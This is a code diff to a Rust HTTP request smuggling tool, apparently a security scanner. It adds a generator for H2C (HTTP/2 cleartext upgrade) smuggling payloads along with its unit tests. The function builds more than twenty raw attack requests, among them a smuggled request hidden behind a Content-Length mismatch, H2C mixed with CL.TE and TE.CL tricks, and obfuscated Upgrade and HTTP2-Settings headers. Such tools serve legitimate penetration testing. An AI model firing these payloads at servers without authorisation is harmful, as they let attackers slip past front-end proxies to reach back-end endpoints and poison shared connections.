@@ -420,6 +420,198 @@ pub fn get_te_te_payloads(
     payloads
 }
 
+/// Generate H2C (HTTP/2 Cleartext) smuggling attack payloads
+/// H2C smuggling exploits discrepancies in how proxies handle HTTP/1.1 to HTTP/2 upgrade requests
+/// Reference: https://bishopfox.com/blog/h2c-smuggling-request
+pub fn get_h2c_payloads(
+    path: &str,
+    host: &str,
+    method: &str,
+    custom_headers: &[String],
+    cookies: &[String],
+) -> Vec<String> {
+    let custom_header_str = format_custom_headers(custom_headers);
+    let cookie_str = format_cookies(cookies);
+
+    let mut payloads = Vec::new();
+
+    // Basic H2C upgrade request
+    // The front-end may not process the upgrade, but the back-end might
+    payloads.push(format!(
+        "{} {} HTTP/1.1\r\n\
+         Host: {}\r\n\
+         {}\
+         {}\
+         Connection: Upgrade, HTTP2-Settings\r\n\
+         Upgrade: h2c\r\n\
+         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
+         Content-Length: 0\r\n\
+         \r\n",
+        method, path, host, custom_header_str, cookie_str
+    ));
+
+    // H2C upgrade with smuggled request (using Content-Length discrepancy)
+    payloads.push(format!(
+        "{} {} HTTP/1.1\r\n\
+         Host: {}\r\n\
+         {}\
+         {}\
+         Connection: Upgrade, HTTP2-Settings\r\n\
+         Upgrade: h2c\r\n\
+         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
+         Content-Length: 30\r\n\
+         \r\n\
+         GET /smuggled HTTP/1.1\r\n\
+         Foo: x",
+        method, path, host, custom_header_str, cookie_str
+    ));
+
+    // H2C upgrade with different Connection header variations
+    let connection_variations = vec![
+        "Connection: Upgrade, HTTP2-Settings, close",
+        "Connection: Upgrade,HTTP2-Settings",
+        "Connection: Upgrade, HTTP2-Settings, keep-alive",
+        "Connection: HTTP2-Settings, Upgrade",
+        "Connection: upgrade, http2-settings", // lowercase
+        "Connection: UPGRADE, HTTP2-SETTINGS", // uppercase
+    ];
+
+    for conn_header in &connection_variations {
+        payloads.push(format!(
+            "{} {} HTTP/1.1\r\n\
+             Host: {}\r\n\
+             {}\
+             {}\
+             {}\r\n\
+             Upgrade: h2c\r\n\
+             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
+             Content-Length: 0\r\n\
+             \r\n",
+            method, path, host, custom_header_str, cookie_str, conn_header
+        ));
+    }
+
+    // Upgrade header variations
+    let upgrade_variations = vec![
+        "Upgrade: h2c",
+        "Upgrade: H2C", // uppercase
+        "Upgrade: h2c, http/1.1", // multiple protocols
+        "Upgrade: http/1.1, h2c", // reversed order
+        " Upgrade: h2c", // space prefix
+        "Upgrade : h2c", // space before colon
+        "Upgrade:\th2c", // tab after colon
+    ];
+
+    for upgrade_header in &upgrade_variations {
+        payloads.push(format!(
+            "{} {} HTTP/1.1\r\n\
+             Host: {}\r\n\
+             {}\
+             {}\
+             Connection: Upgrade, HTTP2-Settings\r\n\
+             {}\r\n\
+             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
+             Content-Length: 0\r\n\
+             \r\n",
+            method, path, host, custom_header_str, cookie_str, upgrade_header
+        ));
+    }
+
+    // HTTP2-Settings header variations (different base64 encoded SETTINGS frames)
+    let http2_settings_variations = vec![
+        "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA", // default
+        "HTTP2-Settings: AAQAAP__", // minimal settings
+        "HTTP2-Settings: AAMAAABkAAQAAP__AAIAAAAA", // alternate settings
+        "http2-settings: AAMAAABkAARAAAAAAAIAAAAA", // lowercase
+        "HTTP2-SETTINGS: AAMAAABkAARAAAAAAAIAAAAA", // uppercase
+        "HTTP2-Settings:AAMAAABkAARAAAAAAAIAAAAA", // no space
+        " HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA", // space prefix
+    ];
+
+    for settings_header in &http2_settings_variations {
+        payloads.push(format!(
+            "{} {} HTTP/1.1\r\n\
+             Host: {}\r\n\
+             {}\
+             {}\
+             Connection: Upgrade, HTTP2-Settings\r\n\
+             Upgrade: h2c\r\n\
+             {}\r\n\
+             Content-Length: 0\r\n\
+             \r\n",
+            method, path, host, custom_header_str, cookie_str, settings_header
+        ));
+    }
+
+    // H2C with Transfer-Encoding (combining H2C with CL.TE techniques)
+    payloads.push(format!(
+        "{} {} HTTP/1.1\r\n\
+         Host: {}\r\n\
+         {}\
+         {}\
+         Connection: Upgrade, HTTP2-Settings\r\n\
+         Upgrade: h2c\r\n\
+         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
+         Content-Length: 6\r\n\
+         Transfer-Encoding: chunked\r\n\
+         \r\n\
+         0\r\n\
+         \r\n\
+         G",
+        method, path, host, custom_header_str, cookie_str
+    ));
+
+    // H2C with chunked encoding (combining H2C with TE.CL techniques)
+    payloads.push(format!(
+        "{} {} HTTP/1.1\r\n\
+         Host: {}\r\n\
+         {}\
+         {}\
+         Connection: Upgrade, HTTP2-Settings\r\n\
+         Upgrade: h2c\r\n\
+         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
+         Transfer-Encoding: chunked\r\n\
+         Content-Length: 4\r\n\
+         \r\n\
+         1\r\n\
+         A\r\n\
+         0\r\n\
+         \r\n",
+        method, path, host, custom_header_str, cookie_str
+    ));
+
+    // Double upgrade headers (upgrade obfuscation similar to TE.TE)
+    payloads.push(format!(
+        "{} {} HTTP/1.1\r\n\
+         Host: {}\r\n\
+         {}\
+         {}\
+         Connection: Upgrade, HTTP2-Settings\r\n\
+         Upgrade: h2c\r\n\
+         Upgrade: http/1.1\r\n\
+         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
+         Content-Length: 0\r\n\
+         \r\n",
+        method, path, host, custom_header_str, cookie_str
+    ));
+
+    // H2C with different HTTP2-Settings positions (HTTP2-Settings before Host)
+    payloads.push(format!(
+        "{} {} HTTP/1.1\r\n\
+         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
+         Host: {}\r\n\
+         {}\
+         {}\
+         Connection: Upgrade, HTTP2-Settings\r\n\
+         Upgrade: h2c\r\n\
+         Content-Length: 0\r\n\
+         \r\n",
+        method, path, host, custom_header_str, cookie_str
+    ));
+
+    payloads
+}
+
 /// Helper function to check if a payload contains a Transfer-Encoding related header
 /// This handles various obfuscation techniques including control characters in header names
 fn contains_te_header_pattern(payload: &str) -> bool {
@@ -1228,5 +1420,241 @@ mod tests {
             "Expected at least 70 Transfer-Encoding variations, got {}",
             te_variations.len()
         );
+    }
+
+    // ========== H2C Smuggling Tests ==========
+
+    #[test]
+    fn test_h2c_payloads_generation() {
+        let payloads = get_h2c_payloads("/", "example.com", "GET", &[], &[]);
+        assert!(!payloads.is_empty(), "H2C payloads should not be empty");
+        
+        // Should have multiple variations
+        assert!(
+            payloads.len() >= 20,
+            "Expected at least 20 H2C payloads, got {}",
+            payloads.len()
+        );
+    }
+
+    #[test]
+    fn test_h2c_basic_payload_structure() {
+        let payloads = get_h2c_payloads("/test", "example.com", "GET", &[], &[]);
+        let payload = &payloads[0];
+
+        // Check for basic H2C upgrade headers
+        assert!(payload.contains("Upgrade: h2c"), "Missing Upgrade: h2c header");
+        assert!(
+            payload.contains("Connection: Upgrade"),
+            "Missing Connection: Upgrade header"
+        );
+        assert!(
+            payload.contains("HTTP2-Settings:"),
+            "Missing HTTP2-Settings header"
+        );
+        assert!(
+            payload.starts_with("GET /test HTTP/1.1"),
+            "Should start with correct request line"
+        );
+        assert!(payload.contains("Host: example.com"), "Missing Host header");
+    }
+
+    #[test]
+    fn test_h2c_upgrade_header_variations() {
+        let payloads = get_h2c_payloads("/", "test.com", "POST", &[], &[]);
+        
+        // Check for uppercase variation
+        let has_uppercase = payloads.iter().any(|p| p.contains("Upgrade: H2C"));
+        assert!(has_uppercase, "Missing uppercase H2C variation");
+        
+        // Check for multiple protocols
+        let has_multiple = payloads.iter().any(|p| p.contains("Upgrade: h2c, http/1.1"));
+        assert!(has_multiple, "Missing multiple protocols variation");
+        
+        // Check for space variations
+        let has_space_prefix = payloads.iter().any(|p| p.contains(" Upgrade: h2c"));
+        assert!(has_space_prefix, "Missing space prefix variation");
+    }
+
+    #[test]
+    fn test_h2c_connection_header_variations() {
+        let payloads = get_h2c_payloads("/", "test.com", "GET", &[], &[]);
+        
+        // Check for lowercase variation
+        let has_lowercase = payloads.iter().any(|p| p.contains("Connection: upgrade, http2-settings"));
+        assert!(has_lowercase, "Missing lowercase connection variation");
+        
+        // Check for uppercase variation
+        let has_uppercase = payloads.iter().any(|p| p.contains("Connection: UPGRADE, HTTP2-SETTINGS"));
+        assert!(has_uppercase, "Missing uppercase connection variation");
+        
+        // Check for different orderings
+        let has_reordered = payloads.iter().any(|p| p.contains("Connection: HTTP2-Settings, Upgrade"));
+        assert!(has_reordered, "Missing reordered connection variation");
+    }
+
+    #[test]
+    fn test_h2c_http2_settings_variations() {
+        let payloads = get_h2c_payloads("/", "test.com", "POST", &[], &[]);
+        
+        // Check for lowercase variation
+        let has_lowercase = payloads.iter().any(|p| p.contains("http2-settings:"));
+        assert!(has_lowercase, "Missing lowercase HTTP2-Settings variation");
+        
+        // Check for no-space variation
+        let has_nospace = payloads.iter().any(|p| p.contains("HTTP2-Settings:AAM"));
+        assert!(has_nospace, "Missing no-space HTTP2-Settings variation");
+        
+        // Check for different settings values
+        let has_minimal = payloads.iter().any(|p| p.contains("HTTP2-Settings: AAQAAP__"));
+        assert!(has_minimal, "Missing minimal settings variation");
+    }
+
+    #[test]
+    fn test_h2c_with_transfer_encoding() {
+        let payloads = get_h2c_payloads("/", "test.com", "POST", &[], &[]);
+        
+        // Should have payload combining H2C with Transfer-Encoding
+        let has_te_combo = payloads.iter().any(|p| {
+            p.contains("Upgrade: h2c") && p.contains("Transfer-Encoding: chunked")
+        });
+        assert!(has_te_combo, "Missing H2C + Transfer-Encoding combination");
+    }
+
+    #[test]
+    fn test_h2c_with_content_length_smuggling() {
+        let payloads = get_h2c_payloads("/", "test.com", "GET", &[], &[]);
+        
+        // Check for smuggled request payload
+        let has_smuggled = payloads.iter().any(|p| {
+            p.contains("Upgrade: h2c") && 
+            p.contains("Content-Length: 30") &&
+            p.contains("GET /smuggled HTTP/1.1")
+        });
+        assert!(has_smuggled, "Missing H2C smuggling with Content-Length payload");
+    }
+
+    #[test]
+    fn test_h2c_double_upgrade_headers() {
+        let payloads = get_h2c_payloads("/", "test.com", "POST", &[], &[]);
+        
+        // Check for double upgrade headers (similar to TE.TE obfuscation)
+        let has_double_upgrade = payloads.iter().any(|p| {
+            let upgrade_count = p.matches("Upgrade:").count();
+            upgrade_count >= 2
+        });
+        assert!(has_double_upgrade, "Missing double Upgrade header variation");
+    }
+
+    #[test]
+    fn test_h2c_with_custom_headers() {
+        let custom_headers = vec![
+            "X-Custom: value".to_string(),
+            "Authorization: Bearer token".to_string(),
+        ];
+        let payloads = get_h2c_payloads("/api", "test.com", "POST", &custom_headers, &[]);
+        
+        for payload in &payloads {
+            assert!(payload.contains("X-Custom: value"), "Missing custom header");
+            assert!(payload.contains("Authorization: Bearer token"), "Missing auth header");
+        }
+    }
+
+    #[test]
+    fn test_h2c_with_cookies() {
+        let cookies = vec!["session=abc123".to_string(), "user=test".to_string()];
+        let payloads = get_h2c_payloads("/", "test.com", "GET", &[], &cookies);
+        
+        for payload in &payloads {
+            assert!(
+                payload.contains("Cookie: session=abc123; user=test"),
+                "Missing cookie header"
+            );
+        }
+    }
+
+    #[test]
+    fn test_h2c_different_methods() {
+        let methods = vec!["GET", "POST", "PUT", "DELETE"];
+        
+        for method in methods {
+            let payloads = get_h2c_payloads("/api", "test.com", method, &[], &[]);
+            for payload in &payloads {
+                assert!(
+                    payload.starts_with(&format!("{} /api HTTP/1.1", method)),
+                    "Method {} not properly set",
+                    method
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn test_h2c_different_paths() {
+        let paths = vec!["/", "/api", "/api/v1/users", "/test?param=value"];
+        
+        for path in paths {
+            let payloads = get_h2c_payloads(path, "test.com", "GET", &[], &[]);
+            for payload in &payloads {
+                assert!(
+                    payload.contains(&format!("GET {} HTTP/1.1", path)),
+                    "Path {} not properly set",
+                    path
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn test_h2c_http_compliance() {
+        let payloads = get_h2c_payloads("/test", "example.com", "GET", &[], &[]);
+        
+        for payload in &payloads {
+            // Each line should end with \r\n
+            let lines: Vec<&str> = payload.split("\r\n").collect();
+            
+            // Should have HTTP version in first line
+            assert!(lines[0].contains("HTTP/1.1"), "Missing HTTP/1.1 in request line");
+            
+            // Should have proper header format
+            let has_host = lines.iter().any(|line| line.starts_with("Host:"));
+            assert!(has_host, "Missing Host header");
+            
+            // Check for Upgrade header (case-insensitive, may have leading space, may have space before colon)
+            let has_upgrade = lines.iter().any(|line| {
+                let trimmed = line.trim_start().to_lowercase();
+                trimmed.starts_with("upgrade") && trimmed.contains("h2c")
+            });
+            assert!(has_upgrade, "Missing Upgrade header in payload:\n{}", payload);
+        }
+    }
+
+    #[test]
+    fn test_h2c_settings_header_position() {
+        let payloads = get_h2c_payloads("/", "test.com", "GET", &[], &[]);
+        
+        // Should have at least one payload with HTTP2-Settings before Host header
+        // The payload with early settings has "HTTP2-Settings:" after "GET / HTTP/1.1"
+        let has_early_settings = payloads.iter().any(|p| {
+            // Find the positions of first occurrence
+            let lines: Vec<&str> = p.split("\r\n").collect();
+            let mut host_idx = None;
+            let mut settings_idx = None;
+            
+            for (idx, line) in lines.iter().enumerate() {
+                if line.starts_with("Host:") && host_idx.is_none() {
+                    host_idx = Some(idx);
+                }
+                if line.to_lowercase().starts_with("http2-settings:") && settings_idx.is_none() {
+                    settings_idx = Some(idx);
+                }
+            }
+            
+            match (host_idx, settings_idx) {
+                (Some(h), Some(s)) => s < h,
+                _ => false,
+            }
+        });
+        assert!(has_early_settings, "Missing early HTTP2-Settings position variation");
     }
 }
